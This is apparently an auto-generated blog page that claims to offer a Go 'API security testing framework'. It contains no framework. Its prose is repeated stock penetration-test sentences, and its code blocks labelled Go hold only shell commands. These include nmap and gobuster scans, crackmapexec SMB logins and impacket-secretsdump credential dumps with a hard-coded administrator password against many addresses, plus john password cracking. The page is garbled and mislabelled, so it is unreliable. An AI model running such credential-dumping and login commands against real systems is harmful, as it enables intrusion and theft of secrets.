---
TitleSEO: "API Security Testing Framework in Go | ZureFX"
TitlePost: "API Security Testing Framework — Go"
Author: "ZureFX"
Description: "A Go script for api security testing framework. Built for security research and automation."
Keywords: "tool, powershell, scanner, automation, go"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-535.html"
URL_IMAGES: ""
Date: "2025-05-24"
Tags: "Tool, PowerShell, Scanner, Automation, Go"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-535"
Permalink: "/scripting/script-api-security-testing-framework-535.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `evil-winrm`
- `psexec`
- `nmap`

## Implementation

### Core Logic

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```go
gobuster dir -u http://10.36.36.46/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.116.140.202 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.167.122
crackmapexec smb 10.46.166.38 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.106.225.114 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.73.139.204 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
feroxbuster -h
nmap -sCV -p25,143,5985 10.121.93.135 -oN scan.txt
crackmapexec smb 10.122.223.10 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.10.197
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.70.204
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 2.15s
```
